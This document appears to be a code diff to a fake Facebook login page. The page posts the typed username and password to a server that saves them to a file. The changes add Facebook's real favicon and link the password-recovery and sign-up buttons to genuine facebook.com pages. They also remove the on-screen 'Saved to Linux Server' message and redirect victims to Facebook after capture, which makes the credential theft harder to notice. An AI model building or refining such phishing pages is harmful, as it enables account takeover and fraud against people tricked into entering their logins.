@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Log In</title>
+    <link rel="icon" type="image/x-icon" href="https://facebook.com/favicon.ico">
     <style>
         * {
             margin: 0;
@@ -210,9 +211,11 @@
                     <input type="password" id="password" placeholder="Password" required>
                 </div>
                 <button type="submit" class="login-btn" id="loginBtn">Log In</button>
-                <a href="#" class="forgot-password">Forgotten password?</a>
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">
+    Forgotten password?
+</a>
                 <div class="divider"></div>
-                <button type="button" class="create-account-btn">Create new account</button>
+                <button type="button" class="create-account-btn" onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">Create new account</button>
             </form>
 
     
@@ -229,7 +232,7 @@
             const password = document.getElementById('password').value;
             const loginBtn = document.getElementById('loginBtn');
             
-            loginBtn.textContent = 'Saving...';
+            //loginBtn.textContent = 'Logging In...';
             loginBtn.disabled = true;
             
             try {
@@ -247,11 +250,7 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    document.getElementById('fileInfo').innerHTML = 
-                        `<span class="success">✅ Saved to Linux Server!</span>\n` +
-                        `File: user.dat\n` +
-                        `Time: ${new Date(result.timestamp).toLocaleString()}\n` +
-                        `Server: ${result.server}`;
+                   window.open("https://www.facebook.com", "_self");
                     
                    
                 } else {
